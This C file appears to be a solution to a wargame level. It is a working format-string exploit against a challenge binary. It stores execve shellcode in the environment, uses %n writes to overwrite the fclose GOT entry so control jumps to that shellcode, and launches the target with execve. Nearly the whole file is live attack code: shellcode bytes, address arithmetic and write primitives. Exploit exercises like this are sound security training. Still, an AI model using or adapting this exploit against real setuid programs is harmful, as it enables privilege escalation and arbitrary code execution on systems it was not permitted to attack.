#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define VULN "../../var/challenge/level8/8"

/* The shellcode for executing the '/usr/local/bin/l33t' command */
char shellcode[] = "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";

int main() {
    /* Obtain the shellcode  address */
	unsigned int addr = 0xc0000000 - 8 - strlen(VULN) - 1 - strlen(shellcode) - 1;
	printf("Using address: %#010x\n", addr);
	/* Retaddr on env @ 0xbfffffab */

    /* Build out the format string using Write4primitives */
	char fmt[] = 
                 "BB" /* Account for the two bytes needed to properly align the memory stack */
		         "\x10\xa0\x04\x08" /* RETLOC, GOT[fclose] */
		         "\x11\xa0\x04\x08" /* RETLOC, GOT[fclose] */
		         "\x12\xa0\x04\x08" /* RETLOC, GOT[fclose] */
		         "\x13\xa0\x04\x08" /* RETLOC, GOT[fclose] */
		         "%147u%68$n" /* Write 0xAB */
		         "%84u%69$n" /* Write 0xFF */
		         "%70$n" /* Write 0xFF */
		         "%192u%71$n"; /* Write 0xBF */	
	
	/* Define a null-terminated ARGV array for execve() */
	char *progWithParameters[] = {VULN, fmt, NULL};
	
	/* Define a null-terminated ENVP (environment) array for execve() */
	/* This is where the shellcode is placed on the environment */
	char *envp[] = {shellcode, NULL};
	
	/* Invoke execve(prog, progWithParameters, envp) */
	if (execve(VULN, progWithParameters, envp) == -1) {
		perror("execve");
        	exit(EXIT_FAILURE);
	}

	/* The code after execve will not be reached if execve is successful */
	return 0;
}